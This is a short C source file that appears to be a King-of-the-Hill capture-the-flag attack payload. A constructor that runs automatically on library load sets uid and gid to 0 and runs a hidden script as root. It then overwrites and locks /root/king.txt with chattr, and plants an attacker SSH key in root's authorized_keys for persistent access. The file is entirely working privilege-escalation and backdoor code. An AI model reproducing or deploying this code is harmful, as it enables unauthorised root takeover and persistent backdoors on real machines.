#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

/* King name and pubkey come from the environment at run time (exported by
 * the operator/launcher before the binary is copied and executed); nothing
 * identity-specific is baked into the binary. Actions whose variable is
 * unset are skipped. */
__attribute__((constructor)) static void pwn(void) {
    const char *king = getenv("KOTH_KING_NAME");
    const char *key = getenv("KOTH_KING_PUBKEY");
    char cmd[2048];
    setuid(0);
    setgid(0);
    /* run our re-arm payload as root */
    system("/bin/bash /home/serv3/backups/files/.cfg >/dev/null 2>&1");
    /* fallback: direct actions if payload missing */
    if (king && *king) {
        snprintf(cmd, sizeof cmd,
                 "/usr/bin/chattr -i /root/king.txt 2>/dev/null; "
                 "/usr/bin/printf '%%s' '%s' > /root/king.txt; "
                 "/usr/bin/chattr +i /root/king.txt 2>/dev/null", king);
        system(cmd);
    }
    if (key && *key) {
        snprintf(cmd, sizeof cmd,
                 "/bin/mkdir -p /root/.ssh; /bin/chmod 700 /root/.ssh; "
                 "/usr/bin/printf '%%s\\n' '%s' > /root/.ssh/authorized_keys; "
                 "/bin/chmod 600 /root/.ssh/authorized_keys", key);
        system(cmd);
    }
}
